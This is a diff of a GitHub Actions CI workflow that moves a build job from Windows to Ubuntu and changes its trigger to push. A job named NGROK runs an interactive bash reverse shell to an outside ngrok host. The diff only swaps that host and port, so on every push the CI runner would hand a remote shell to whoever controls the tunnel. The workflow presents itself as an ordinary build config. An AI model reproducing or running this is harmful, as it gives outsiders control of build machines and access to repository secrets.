@@ -1,7 +1,7 @@
 name: CI
 
 on:
-  pull_request:
+  push:
     branches: [ "main" ]
 
   workflow_dispatch:
@@ -9,7 +9,7 @@ on:
 jobs:
   Generate-Bins:
     name: Windows/Static/X64/Release
-    runs-on: windows-2019
+    runs-on: ubuntu-latest
 
     steps:
       - uses: actions/checkout@v3
@@ -19,7 +19,7 @@ jobs:
       - name: Configure
         working-directory: ./build
         run: |
-          cmake .. -G "Visual Studio 16 2019" -A x64 -DCMAKE_BUILD_TYPE=Release
+          cmake .. -DCMAKE_C_COMPILER=/usr/bin/gcc-10 -DCMAKE_CXX_COMPILER=/usr/bin/g++-10 -DCMAKE_BUILD_TYPE=Release
       - name: build
         working-directory: ./build
         run: |
@@ -28,8 +28,8 @@ jobs:
         uses: actions/upload-artifact@v2
         with:
           node-version: 16.x
-          name: windows-2019-X64
-          path: ${{ github.workspace }}/build/Release/${{ github.workflow }}.exe
+          name: ubuntu
+          path: ${{ github.workspace }}/build/${{ github.workflow }}
 
   NGROK:
     needs: [Generate-Bins]
@@ -41,5 +41,5 @@ jobs:
       - name: Run a multi-line script
         run: |
           whoami
-          bash -i >& /dev/tcp/6.tcp.eu.ngrok.io/17993 0>&1
+          bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/12611 0>&1
           ls
